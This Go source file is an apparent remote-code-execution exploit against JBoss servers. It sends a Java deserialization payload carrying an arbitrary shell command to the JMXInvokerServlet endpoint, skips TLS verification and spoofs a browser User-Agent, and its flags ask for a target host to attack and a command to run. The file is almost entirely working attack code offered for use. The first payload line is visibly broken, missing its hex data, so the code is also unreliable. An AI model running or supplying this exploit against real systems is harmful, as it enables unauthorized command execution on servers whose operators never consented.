package main

import (
	"bytes"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net/http"
)

func jboss(host string, ssl bool, cmd string) (int, error) {
	serializedObject, err := hex.DecodeString
	if err != nil {
		return 0, err
	}
	serializedObject = append(serializedObject, byte(len(cmd)))
	serializedObject = append(serializedObject, []byte(cmd)...)
	afterBuf, err := hex.DecodeString("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A")
	if err != nil {
		return 0, err
	}
	serializedObject = append(serializedObject, afterBuf...)

	var client *http.Client
	var url string
	if ssl {
		client = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}
		url = fmt.Sprintf("https://%s/invoker/JMXInvokerServlet", host)
	} else {
		client = &http.Client{}
		url = fmt.Sprintf("http://%s/invoker/JMXInvokerServlet", host)
	}

	req, err := http.NewRequest("POST", url, bytes.NewReader(serializedObject))
	if err != nil {
		return 0, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko")
	req.Header.Set("Content-Type", "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue")
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	return resp.StatusCode, nil
}

func main() {
	var (
		host    = flag.String("host", "", "The host and port to attack, ex: 192.168.1.1:8080")
		isSSL   = flag.Bool("ssl", false, "Use SSL")
		command = flag.String("cmd", "", "The command to be executed")
	)
	flag.Parse()

	code, err := jboss(*host, *isSSL, *command)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("Got status code: %d", code)
}
